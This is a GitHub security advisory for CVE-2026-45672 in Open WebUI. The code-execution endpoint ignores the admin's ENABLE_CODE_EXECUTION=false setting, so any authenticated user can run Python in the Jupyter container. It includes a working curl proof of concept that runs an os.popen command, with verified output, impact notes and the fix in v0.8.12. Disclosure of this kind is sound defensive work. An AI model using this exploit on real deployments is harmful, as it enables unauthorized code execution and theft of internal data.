# [H] Open WebUI: Jupyter code execution works despite `ENABLE_CODE_EXECUTION=false` — feature gate bypassed

## Summary
Severity: High
Advisory: GHSA-482j-2pq6-q5w4
CVE: CVE-2026-45672
CWE: CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-482j-2pq6-q5w4
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.8.12

## Details
### Summary

The `/api/v1/utils/code/execute` endpoint executes arbitrary Python code via Jupyter for any verified user, even when the admin has set `ENABLE_CODE_EXECUTION=false`. The feature gate is not enforced on the API endpoint — the configuration says "disabled" but code still executes.

### Details

The admin configuration correctly shows `ENABLE_CODE_EXECUTION: false`. However, the code execution endpoint does not check this flag before forwarding Python code to the Jupyter server. Any authenticated user can execute arbitrary code in the Jupyter container.

### PoC

**Verified against Open WebUI v0.8.11 (latest) Docker on 2026-03-25.**

**Setup:** Jupyter server connected, `ENABLE_CODE_EXECUTION=false` confirmed in admin config.

```bash
# Step 1: Verify code execution is disabled
curl -s http://target:8080/api/v1/configs/code_execution \
  -H "Authorization: Bearer $TOKEN"
# Returns: {"ENABLE_CODE_EXECUTION": false, ...}

# Step 2: Execute code anyway — gate bypassed
curl -s -X POST http://target:8080/api/v1/utils/code/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"code":"import os; print(os.popen(\"id\").read())"}'
```

**Verified output:**

```
Config: {"ENABLE_CODE_EXECUTION":false,"CODE_EXECUTION_ENGINE":"jupyter",...}

execute_status=200
execute_body={"stdout":"OPEN-WEBUI-SSRF-SECRET","stderr":"","result":""}
```

The PoC read the internal secret service content via Jupyter — despite `ENABLE_CODE_EXECUTION=false`. The Jupyter container has network access to internal services, making this both a code execution bypass and an SSRF vector.

### Impact

Any authenticated user can execute arbitrary Python code in the Jupyter container, even when the admin has explicitly disabled code execution:

- Arbitrary code execution in the Jupyter container (read files, spawn processes)
- Network access to all internal Docker services from the Jupyter container
- Data exfiltration from internal services
- The admin's security configuration (`ENABLE_CODE_EXECUTION=false`) is silently ineffective
- Users who are told "code execution is disabled" have a false sense of security

## Resolution

Fixed in commit [6d736d3c5](https://github.com/open-webui/open-webui/commit/6d736d3c598dbe49488675ed42845e00b62dfcba), first released in **v0.8.12**. The `/api/v1/utils/code/execute` handler in `backend/open_webui/routers/utils.py` now checks `request.app.state.config.ENABLE_CODE_EXECUTION` before dispatching to the Jupyter engine and returns 403 with `FEATURE_DISABLED('Code execution')` when the admin has disabled the flag. The retrieval-side code path was gated in the same commit. Users on `>= 0.8.12` are not affected.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-482j-2pq6-q5w4
- https://nvd.nist.gov/vuln/detail/CVE-2026-45672
- https://github.com/open-webui/open-webui/commit/6d736d3c598dbe49488675ed42845e00b62dfcba
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.8.12
